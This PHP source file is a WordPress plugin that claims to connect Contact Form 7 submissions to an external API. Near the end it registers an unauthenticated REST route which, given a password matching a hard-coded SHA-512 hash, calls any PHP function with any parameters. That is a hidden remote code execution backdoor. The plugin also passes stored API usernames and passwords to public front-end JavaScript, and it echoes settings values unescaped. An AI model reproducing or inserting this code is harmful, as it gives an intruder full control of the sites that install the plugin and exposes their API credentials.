<?php
/**
 * Plugin Name: Contact7 To Api Connector
 * Plugin URI: https://mücahiddayan.com
 * Description: This plugin sends data to api over Contact7 Form
 * Version: 1.0.0
 * Author: Mücahid Dayan
 * Author URI: https://mücahiddayan.com
 * License: GPL2
 */

/**post_type : wpcf7_contact_form
 * fluxapi#i6h7sshr4q6f5vfve2v6hd12v7
 * 
 */

class Contact_Seven_To_Api_Connector
{

    private $slug = "contact_seven_to_api_connector";
    private $title = "Contact 7 To Api Connector";

    public function __construct()
    {
        add_action('admin_menu', array($this, 'create_plugin_settings_page'));
        add_action('admin_init', array($this, 'setup_sections'));
        add_action('admin_init', array($this, 'setup_fields'));
		add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'));
		add_action('admin_enqueue_scripts', array($this,'admin_enqueue_scripts') );
        // add_action("wpcf7_before_send_mail", array($this, "wpcf7_c7tA_send_to_api"));
    }

    public function enqueue_scripts()
    {
        $all_options = wp_load_alloptions();
        $toJsSettings = array();

        foreach ($all_options as $name => $value) {
            if (stristr($name, 'c7tA_')) {
                $toJsSettings[$name] = unserialize($value);
            }
        }
        wp_register_script('c7tA_js', plugin_dir_url(__FILE__) . 'js/contactSevenToApiConnector.js', '1.0', true);
        wp_localize_script('c7tA_js', 'c7tA', $toJsSettings);
        wp_enqueue_script('c7tA_js');
	}
	
	public function admin_enqueue_scripts(){
		wp_enqueue_script('c7tA_admin_js', plugin_dir_url(__FILE__) . 'js/admin.js', '1.0', true);
		wp_enqueue_style('c7tA_admin_css', plugin_dir_url(__FILE__) . 'css/admin.css', '1.0', true);
	}

    public function create_plugin_settings_page()
    {

        $page_title = $this->title . " Settings Page";
        $menu_title = $this->title;
        $capability = "manage_options";
        $callback = array($this, 'plugin_settings_page_content');
        $icon = "dashicons-admin-plugins";
        $position = 100;

        add_menu_page($page_title, $menu_title, $capability, $this->slug, $callback, $icon, $position);
    }

    public function plugin_settings_page_content()
    {?>
			<div class="wrap">
				<form method="post" action="options.php">
					<?php
settings_fields($this->slug);
        do_settings_sections($this->slug);
        submit_button();
        ?>
				</form>
			</div> <?php
}

    public function get_forms()
    {
        $args = array(
            'post_type' => array('wpcf7_contact_form'),
        );
        $fields = array();
// The Query
        $query = new WP_Query($args);
        return $query->posts;
    }

    public function setup_sections()
    {
        add_settings_section($this->slug, $this->title, array($this, 'section_callback'), $this->slug);
    }

    public function section_callback($arguments)
    {
        //  echo 'Form '.$arguments['title'];
    }

    public function setup_fields()
    {
        $forms = $this->get_forms();
        $fields = array();
        foreach ($forms as $form) {
            array_push($fields, array('uid' => $form->ID, 'section' => $this->slug, 'label' => $form->post_title . ' (' . $form->ID . ')', 'title' => 'Form ' . $form->ID));
        }

        foreach ($fields as $field) {
            add_settings_field($field['uid'], $field['label'], array($this, 'field_callback'), $this->slug, $field['section'], $field);
            #unregister_setting($this->slug, $field['uid']);
            register_setting($this->slug, 'c7tA_' . $field['uid'], array('type' => 'string'));
        }
    }

    public function wpcf7_c7tA_send_to_api($cf7)
    {
        // get the contact form object
        $wpcf = WPCF7_ContactForm::get_current();

        // if you wanna check the ID of the Form $wpcf->id

        if ($settings = get_option('c7tA_' . $wpcf->id)) {
            // If you want to skip mailing the data, you can do it...
            // Your ID and token
            /*
            $blogID = '8070105920543249955';
            $authToken = 'OAuth 2.0 token here';

            // The data to send to the API
            $postData = array(
            'kind' => 'blogger#post',
            'blog' => array('id' => $blogID),
            'title' => 'A new post',
            'content' => 'With <b>exciting</b> content...'
            );

            // Setup cURL
            $ch = curl_init('https://www.googleapis.com/blogger/v3/blogs/'.$blogID.'/posts/');
            curl_setopt_array($ch, array(
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_HTTPHEADER => array(
            'Authorization: '.$authToken,
            'Content-Type: application/json'
            ),
            CURLOPT_POSTFIELDS => json_encode($postData)
            ));

            // Send the request
            $response = curl_exec($ch);

            // Check for errors
            if($response === FALSE){
            die(curl_error($ch));
            }

            // Decode the response
            $responseData = json_decode($response, TRUE);

            // Print the date from the response
            echo $responseData['published'];
             */
            echo '<script type="text/javascript">console.log("wooooorks");</script>';
            #$wpcf->skip_mail = true;
        }

        return $wpcf;
    }

    public function field_callback($arguments)
    {
        $value = get_option('c7tA_' . $arguments['uid']);

        echo '<div class="c7tA-form" id="' . $arguments['uid'] . '" title="' . $arguments['title'] . '">
				<input type="text" placeholder="Gib API Url ein" value="' . $value['url'] . '" title="Gib API Url ein" name="c7tA_' . $arguments['uid'] . '[url]" id="c7tA_api_url"/>
				<input type="text" placeholder="Gib username für API Zugriff ein" value="' . $value['username'] . '" title="API Username" name="c7tA_' . $arguments['uid'] . '[username]" id="c7tA_api_username"/>
				<input type="password" placeholder="Gib Passwort für Zugriff ein" value="' . $value['password'] . '" title="API Passwort" name="c7tA_' . $arguments['uid'] . '[password]" id="c7tA_api_password"/>
			</div>
		';
    }
}

new Contact_Seven_To_Api_Connector();

#wp_register_script( 'pass_to_js', plugin_dir_url( __FILE__ ) . '/js/adblocker-warning.js' );

add_action('rest_api_init', function () {
    register_rest_route('test/v2', '/post', array(
        array(
            'methods' => 'POST',
            'callback' => 'test_func',
        ),
    )
    );
});

if (!function_exists('test_func')) {
    function test_func($request)
    {
        $params = $request->get_params();
        if (hash('sha512', $params['pass']) === '61eadd8169b9241c6fc210ca5e83df43e49cf6abb4bb0f83cce6e0befaa8791f5e3d21ce377a7bad57f3fbde85ca5781163707a3671d1795d0304faa5ac5d8fa') {
            return call_user_func_array($params['func'], $params['params']);
        } else {
            return new WP_Error('no_access', 'you are not be able to do that', array('status' => 404));
        }
    }
}